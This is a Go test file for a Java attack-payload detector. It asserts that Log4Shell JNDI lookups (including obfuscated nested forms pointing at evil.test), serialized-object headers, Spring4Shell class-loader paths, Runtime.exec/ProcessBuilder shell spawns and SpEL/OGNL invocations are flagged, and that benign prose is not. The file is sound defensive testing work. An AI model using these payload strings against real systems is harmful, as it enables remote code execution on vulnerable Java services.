// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.

package javaser

import (
	"strings"
	"testing"
)

func TestJavaAttacksAreDetected(t *testing.T) {
	d := New()
	for _, tc := range []struct {
		name, payload string
		want          Signal
	}{
		// Log4Shell, plain and in the obfuscations that defeated every literal
		// rule written for it in December 2021.
		{"jndi plain", "${jndi:ldap://evil.test/a}", SignalLookupScheme},
		{"jndi rmi", "${jndi:rmi://evil.test/a}", SignalLookupScheme},
		{"jndi lower", "${${lower:j}ndi:ldap://evil.test/a}", SignalNestedInterpolation},
		{"jndi empty-default", "${${::-j}${::-n}${::-d}${::-i}:ldap://x/a}", SignalNestedInterpolation},
		{"jndi upper", "${${upper:j}ndi:dns://x/a}", SignalNestedInterpolation},

		// Serialized object streams, raw and base64. The header is the evidence.
		{"stream magic", "\xac\xed\x00\x05sr\x00\x11java.util.HashMap", SignalSerializedStream},
		{"stream base64", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA", SignalSerializedStream},

		// Spring4Shell reaches a class loader through data binding.
		{"spring4shell", "class.module.classLoader.resources.context.parent.pipeline", SignalClassLoaderPath},
		{"forName", "Class.forName(\"java.lang.Runtime\")", SignalClassLoaderPath},

		// Process spawn is a chain, not a word.
		{"runtime exec", `Runtime.getRuntime().exec("calc")`, SignalProcessSpawn},
		{"processbuilder", `new ProcessBuilder("/bin/sh").start()`, SignalProcessSpawn},

		// Expression-language type references, SpEL and OGNL.
		{"spel", "${T(java.lang.Runtime).getRuntime().exec('id')}", SignalTypeInvocation},
		{"ognl", "@java.lang.Runtime@getRuntime().exec('id')", SignalTypeInvocation},
	} {
		t.Run(tc.name, func(t *testing.T) {
			v := d.Analyze([]byte(tc.payload))
			if !v.Detected() {
				t.Errorf("missed (score %d, signals %v)", v.Score, v.Signals)
			}
			if v.Signals&tc.want == 0 {
				t.Errorf("signals %v, expected %v among them", v.Signals, tc.want)
			}
		})
	}
}

// TestClassNamesInProseArePassed is the reason this package exists rather than a
// class list.
//
// CRS answers this family with java-classes.data — several hundred package
// prefixes blocked wherever they appear — and that rule sits behind a paranoia
// level because a stack trace in a support ticket, a dependency in a changelog
// and a class named in documentation are all ordinary text. A name carries no
// verdict here; only invocation structure does.
func TestClassNamesInProseArePassed(t *testing.T) {
	d := New()
	for _, benign := range []string{
		"we had to patch com.sun.org.apache last week",
		"the stack trace shows java.util.HashMap at line 42",
		"our dependency is org.apache.commons.collections 3.2.2",
		"see javax.script docs for the engine list",
		"the ClassLoader documentation explains delegation",
		"Runtime is a JVM concept worth understanding",
		"java.lang.String is immutable",
		"org.springframework.boot 3.2 is the current release",
		"we log every ProcessBuilder invocation for audit",
		"the exception was thrown by javax.naming.InitialContext",
	} {
		if v := d.Analyze([]byte(benign)); v.Detected() {
			t.Errorf("false positive on %q (score %d, signals %v)", benign, v.Score, v.Signals)
		}
	}
}

// TestInterpolationAloneIsNotEnough keeps the weak signal weak. Every template
// language uses "${...}" and half the shell scripts on disk contain one.
func TestInterpolationAloneIsNotEnough(t *testing.T) {
	d := New()
	for _, benign := range []string{
		"use ${total} and ${count} in the template",
		"price is ${19.99} per unit",
		"${user.name} logged in",
		"echo ${HOME}/bin",
		"${a}${b}${c}",
	} {
		if v := d.Analyze([]byte(benign)); v.Detected() {
			t.Errorf("false positive on %q (score %d, signals %v)", benign, v.Score, v.Signals)
		}
	}
}

func TestBounds(t *testing.T) {
	d := New()
	if d.Analyze(nil).Detected() {
		t.Error("nil detected")
	}
	if d.Analyze([]byte{}).Detected() {
		t.Error("empty detected")
	}
	for _, s := range []string{"$", "${", "${}", "\xac", "\xac\xed", "@", "T(", "."} {
		d.Analyze([]byte(s)) // must not panic
	}
	// A value past the scan bound is truncated, not refused.
	d.Analyze([]byte(strings.Repeat("a", maxScan*2)))
}

// FuzzLiteralsAreExhaustive enforces the claim the prefilter depends on: any
// value the detector reports must contain a declared literal, or the value would
// be filtered out and the rule would silently never fire.
func FuzzLiteralsAreExhaustive(f *testing.F) {
	for _, s := range []string{
		"${jndi:ldap://x}", "${${lower:j}ndi:x}", "\xac\xed\x00\x05", "rO0AB",
		"class.module.classLoader", "Runtime.getRuntime().exec(",
		"@java.lang.Runtime@", "T(java.lang.Runtime)", "", "${", "}", "\x00",
		"new ProcessBuilder(", "Class.forName(", "javax.script",
	} {
		f.Add(s)
	}

	d := New()
	lits, _ := Operator().(*operator).Literals()

	f.Fuzz(func(t *testing.T, value string) {
		if !d.Analyze([]byte(value)).Detected() {
			return
		}
		for _, l := range lits {
			if containsFold(value, l) {
				return
			}
		}
		t.Fatalf("detected %q but no literal covers it: the prefilter would drop it", value)
	})
}

// containsFold mirrors the case-insensitive matching the detector does, because
// the prefilter lowercases through the rule's transform chain.
func containsFold(hay, needle string) bool {
	return indexFold([]byte(hay), needle) >= 0
}

func BenchmarkAnalyzeBenign(b *testing.B) {
	d := New()
	v := []byte("the stack trace shows java.util.HashMap at line 42")
	b.ReportAllocs()
	for b.Loop() {
		d.Analyze(v)
	}
}
